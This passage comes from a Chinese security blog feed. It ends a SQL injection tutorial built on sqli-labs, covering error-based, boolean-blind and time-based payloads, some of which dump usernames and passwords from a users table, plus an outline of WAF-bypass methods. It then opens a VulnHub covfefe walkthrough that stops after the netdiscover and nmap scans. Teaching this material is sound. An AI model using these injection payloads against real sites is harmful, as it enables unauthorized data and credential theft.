&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and extractvalue(&amp;#39;&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">/&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="s1">&amp;#39;,concat(0x7e,(select group_concat(username) from users), 0x7e)) -- +
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="floor">floor()
&lt;/h5>&lt;p>&lt;strong>基本信息&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>floor()&lt;/strong>: 去除小数部分；&lt;/li>
&lt;li>&lt;strong>count()&lt;/strong>: 统计记录数目；&lt;/li>
&lt;li>&lt;strong>rand(x)&lt;/strong>: 产生随机数，每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可预测的；&lt;/li>
&lt;li>&lt;strong>group by&lt;/strong>: 对数据进行分组；&lt;/li>
&lt;li>错误输出最大长度为64位。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">GROUP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>报错原因&lt;/strong>&lt;/p>
&lt;p>&lt;a class="link" href="https://www.freebuf.com/column/235496.html" target="_blank" rel="noopener"
>Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户&lt;/a>&lt;/p>
&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and (SELECT 1 FROM (SELECT count(*), concat((select table_name from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x) a) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="exp">exp()
&lt;/h5>&lt;p>&lt;strong>基本信息&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>exp()&lt;/strong>: 返回e 的 输入数次方；&lt;/li>
&lt;li>错误输出最大长度为64位。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">exp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>报错原因&lt;/strong>&lt;/p>
&lt;p>当传递一个大于709的值时，函数exp()就会引起一个溢出错误。&lt;/p>
&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and exp(~(select * from(select group_concat(password) from users) as a)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="geometrycollection">geometrycollection()
&lt;/h5>&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">geometrycollection&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and geometrycollection((select * from(select * from(select user())a)b)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="multipoint">multipoint()
&lt;/h5>&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">multipoint&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and multipoint((select * from(select * from(select user())a)b)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="polygon">polygon()
&lt;/h5>&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">polygon&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and polygon((select * from(select * from(select database())a)b)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="multipolygon">multipolygon()
&lt;/h5>&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">multipolygon&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and multipolygon((select * from(select * from(select user())a)b)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="linestring">linestring()
&lt;/h5>&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">linestring&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and linestring((select * from(select * from(select user())a)b)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="multilinestring">multilinestring()
&lt;/h5>&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">multilinestring&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and multilinestring((select * from(select * from(select user())a)b)) --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-布尔盲注">3. 布尔盲注
&lt;/h3>&lt;h4 id="概念-2">概念
&lt;/h4>&lt;blockquote>
&lt;p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 &lt;code>true&lt;/code> 、 &lt;code>false&lt;/code>使web页面返回true或者false，从而达到注入的目的来获取信息&lt;/p>
&lt;/blockquote>
&lt;h4 id="常用函数">常用函数
&lt;/h4>&lt;ul>
&lt;li>&lt;strong>length()&lt;/strong>：返回字符串的长度；&lt;/li>
&lt;li>&lt;strong>substr()&lt;/strong>：截取字符串；&lt;/li>
&lt;li>&lt;strong>left()&lt;/strong>：从左至右截取字符串；&lt;/li>
&lt;li>&lt;strong>ascii()&lt;/strong>：返回字符的 Ascii 码值；&lt;/li>
&lt;li>&lt;strong>regexp()&lt;/strong>：正则表达式；&lt;/li>
&lt;li>&lt;strong>ord()&lt;/strong>：返回字符串第一个字符的 Ascii 码值；&lt;/li>
&lt;li>&lt;strong>mid()&lt;/strong>：从文本字段中提取字符；&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;p>PS：此处使用 sqli-labs 第8关进行演示。&lt;/p>
&lt;p>&lt;strong>获取数据库名称长度&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>?id=1&amp;#39; and length(database())=7 --+
?id=1&amp;#39; and length(database())=8 --+
&lt;/code>&lt;/pre>&lt;p>获取数据库名称&lt;/p>
&lt;pre tabindex="0">&lt;code>?id=1&amp;#39; and (left(database(), 1) = &amp;#39;s&amp;#39; ) --+
?id=1&amp;#39; and (substr(database(), 2, 1) = &amp;#39;e&amp;#39; ) --+
?id=1&amp;#39; and (substr(database(), 3, 1) = &amp;#39;c&amp;#39; ) --+
?id=1&amp;#39; and (substr(database(), 4, 1) = &amp;#39;u&amp;#39; ) --+
...
&lt;/code>&lt;/pre>&lt;h3 id="4-基于时间的布尔盲注">4. 基于时间的布尔盲注
&lt;/h3>&lt;blockquote>
&lt;p>时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据。&lt;strong>基于时间的布尔盲注就是在基于布尔的盲注上结合if判断和sleep（）函数来得到一个时间上的变换延迟的参照&lt;/strong>。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;p>PS：sqli-labs第9关&lt;/p>
&lt;pre tabindex="0">&lt;code>?id=1&amp;#39; and if(length(database())&amp;gt;1, sleep(5), 0) --+
&lt;/code>&lt;/pre>&lt;h2 id="三注入位置">三、注入位置
&lt;/h2>&lt;h4 id="1-get">1. GET
&lt;/h4>&lt;blockquote>
&lt;p>注入点 url 中&lt;/p>
&lt;/blockquote>
&lt;p>示例：sqli-labs：Less-1&lt;/p>
&lt;h4 id="2-post">2. POST
&lt;/h4>&lt;blockquote>
&lt;p>注入点在 POST 提交的表单中&lt;/p>
&lt;/blockquote>
&lt;p>示例：sqli-labs：Less-11&lt;/p>
&lt;h4 id="3-cookie">3. Cookie
&lt;/h4>&lt;blockquote>
&lt;p>注入点位置在 Cookie 中&lt;/p>
&lt;/blockquote>
&lt;p>示例：sqli-labs：Less-20&lt;/p>
&lt;h2 id="四注入拓展">四、注入拓展
&lt;/h2>&lt;h3 id="1-编解码注入">1. 编解码注入
&lt;/h3>&lt;blockquote>
&lt;p>base64注入是针对传递的参数被base64加密后的注入点进行注入。&lt;/p>
&lt;/blockquote>
&lt;h3 id="2-json注入">2. JSON注入
&lt;/h3>&lt;blockquote>
&lt;p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON注入实际上就是注入点在 JSON 数据中。&lt;/p>
&lt;/blockquote>
&lt;h3 id="3-ladp-注入">3. LADP 注入
&lt;/h3>&lt;blockquote>
&lt;p>&lt;strong>LDAP(Lightweight Directory Access Protocol)&lt;/strong>：轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现，是运行于TCP/IP之上的协议，端口号为：&lt;strong>389&lt;/strong>， 加密&lt;strong>636&lt;/strong>（SSL）&lt;/p>
&lt;/blockquote>
&lt;h3 id="4-dnslog-注入">4. DNSlog 注入
&lt;/h3>&lt;blockquote>
&lt;p>DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名www.baidu.com等的访问信息，类似日志文件。在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。DNSlog注入主要用于解决盲注时不能回显结果的问题。&lt;/p>
&lt;/blockquote>
&lt;h3 id="5-二次注入">5. 二次注入
&lt;/h3>&lt;blockquote>
&lt;p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。&lt;/p>
&lt;/blockquote>
&lt;p>示例：sqli-labs：Less-24&lt;/p>
&lt;h3 id="6-堆叠查询">6. 堆叠查询
&lt;/h3>&lt;blockquote>
&lt;p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。&lt;/p>
&lt;p>而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。&lt;/p>
&lt;/blockquote>
&lt;h2 id="五waf-绕过">五、WAF 绕过
&lt;/h2>&lt;h3 id="1-大小写绕过">1. 大小写绕过
&lt;/h3>&lt;blockquote>
&lt;p>大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术。&lt;/p>
&lt;/blockquote>
&lt;h3 id="2-替换关键字">2. 替换关键字
&lt;/h3>&lt;blockquote>
&lt;p>为了绕过正则关键字匹配，我们可以采取替换关键词的方式进行绕过。&lt;/p>
&lt;/blockquote>
&lt;h3 id="3-使用编码">3. 使用编码
&lt;/h3>&lt;h4 id="1url编码">（1）URL编码
&lt;/h4>&lt;h4 id="2-十六进制编码">（2) 十六进制编码
&lt;/h4>&lt;h4 id="3-unicode编码">(3) Unicode编码
&lt;/h4>&lt;h3 id="4-使用注释">4. 使用注释
&lt;/h3>&lt;h3 id="5-等价函数与命令">5. 等价函数与命令
&lt;/h3>&lt;h3 id="6-特殊符号">6. 特殊符号
&lt;/h3>&lt;h3 id="7-http参数控制">7. HTTP参数控制
&lt;/h3>&lt;h3 id="8-缓冲区溢出">8. 缓冲区溢出
&lt;/h3>&lt;h3 id="9-整合绕过">9. 整合绕过
&lt;/h3></description></item><item><title>靶机渗透：coyfefe</title><link>https://wlynxg.github.io/blog/p/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fcoyfefe/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fcoyfefe/</guid><description>&lt;h1 id="靶机渗透coyfefe">靶机渗透：coyfefe
&lt;/h1>&lt;h2 id="0x00靶机安装与启动">0x00：靶机安装与启动
&lt;/h2>&lt;p>靶机地址：&lt;a class="link" href="https://www.vulnhub.com/entry/covfefe-1,199/" target="_blank" rel="noopener"
>covfefe: 1 ~ VulnHub&lt;/a>&lt;/p>
&lt;p>在 VM 上安装好靶机后，将靶机与攻击机配置到同一局域网内，启动靶机：&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170627.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h2 id="0x01渗透过程">0x01：渗透过程
&lt;/h2>&lt;h3 id="1-搜索靶机地址">1. 搜索靶机地址
&lt;/h3>&lt;p>首先使用 &lt;strong>netdiscover&lt;/strong> 工具找到靶机 IP 地址：&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo netdiscover -r 192.168.1.0/24
Output:
Currently scanning: Finished! | Screen View: Unique Hosts
286 Captured ARP Req/Rep packets, from 7 hosts. Total size: 17160
_____________________________________________________________________________
IP At MAC Address Count Len MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.1 bc:54:fc:2c:60:2c 230 13800 SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.
192.168.1.105 00:0c:29:38:64:81 40 2400 VMware, Inc.
&lt;/code>&lt;/pre>&lt;p>找到靶机地址为：192.168.1.105；&lt;/p>
&lt;h3 id="2-扫描靶机开放端口">2. 扫描靶机开放端口
&lt;/h3>&lt;p>使用 &lt;strong>namp&lt;/strong> 扫描靶机开放端口：&lt;/p>
&lt;pre tabindex="0">&lt;code>nmap -sV 192.168.1.105
output:
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.4p1 Debian 10 (protocol 2.0)
80/tcp open http nginx 1.10.3
31337/tcp open http Werkzeug httpd 0.11.15 (Python 3.5.3)
